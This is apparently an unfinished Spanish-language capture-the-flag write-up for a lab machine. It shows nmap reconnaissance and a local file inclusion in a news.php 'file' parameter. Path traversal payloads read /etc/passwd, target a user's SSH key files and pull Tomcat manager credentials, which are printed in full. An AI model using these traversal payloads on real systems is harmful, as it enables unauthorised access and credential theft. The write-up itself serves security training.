## Summary

Tags: #Linux #HTTP #SSH #Tomcat #LFI #DirectoryPathTraversal 

- IP -> 10.10.11.194
- Ports -> TCP (80, 22, 8080), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4
    - 80 -> Apache httpd 2.4.41
    - 8080 -> Apache Tomcat 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

22 -> OpenSSH 8.2p1 Ubuntu 4 -> Focal
Apache httpd 2.4.41 -> Focal 

## Recon

```bash
❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p22,80,8080 ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

Ahora nos disponemos a ver en la web por ambos puertos, el 80 y el 8080.

* En el puerto 80 de la pagina encontramos dentro la web una pestaña llamada "NEWS" en donde no podemos ingresar ya que esta haciendo virtual hosting. Por lo que debemos de agregar el dominio a nuestro **/etc/hosts** 

Dentro de NEWS observamos lo siguiente en la url:
```bash 
❯ megahosting.htb/news.php?file=statement

# Ahi podemos observar que hay un '?file=' que nos puede llevar a un LFI (Local File Inclusion), por lo que probamos lo siguiente en la URL

❯ megahosting.htb/news.php?file=/../../../../../etc/passwd       # Hacemos un Directory Path Traversal para ver el /etc/host de la maquina victima, si se ve raro el output hacemos 'Ctrl + u'

# Podemos observar dos usuarios, el primero es 'root' y el segundo 'ash', por lo que nos disponemos a ver si podemos ver mas cosas como:
❯ megahosting.htb/news.php?file=/../../../../../home/ash/user.txt
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/authorized_keys
❯ megahosting.htb/news.php?file=/../../../../../home/ash/.ssh/id_rsa.pub
# Pero no podemos mirar nada de los comandos anteriores 
```

* Miramos que en el puerto 8080 encontramos un Tomcat y nos muestra donde nos da un enlace a **manager webapp**, nos pide un usuario y una passwd. Colocamos las clásicas **admin:admin**, nos dará un error pero nos redireccionara a una nueva pagina.
	
	* Encontramos una ruta: **/etc/tomcat9/tomcat-user.xml**

Miramos esa ruta por el puerto 80, ya que podemos hacer usar el **Directory Path Traversal** y encontramos lo siguiente:
Como no nos muestra nada, nos disponemos a buscar en Google 'Tomcat User Common Path ' , ya que no siempre esa es la ruta de un Tomcat9, ahora encontramos esta nueva ruta: 
	**/usr/share/tomcat9/etc/tomcat-users.xml** 

Miramos esa ruta en la web por el puerto 80 con el **Directory Path Traversal** y encontramos:
	user: tomcat | Passwd: $3cureP4s5w0rd123!

Recordemos la ruta típica de Tomcat para poder entrar que es: **/manager/html** en donde nos pedirá una autenticación, y como ya tenemos el usuario y la passwd la colocamos en el panel y así lograremos entrar.



## User

Hola mundo 
## Root